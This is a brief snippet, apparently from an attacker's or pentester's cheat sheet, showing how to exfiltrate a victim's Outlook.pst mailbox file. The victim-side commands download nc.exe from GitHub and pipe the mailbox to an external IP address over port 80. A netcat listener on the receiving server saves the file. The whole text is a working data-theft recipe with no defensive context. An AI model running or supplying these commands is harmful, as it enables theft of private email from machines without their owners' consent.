On victim/client:
```bash
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe -Outfile nc.exe
cmd /c 'nc.exe -w 3 23.88.111.175 80 < Outlook.pst'
```

On receiving server:

```bash
nc -l -p 80 > Outlook.pst
```
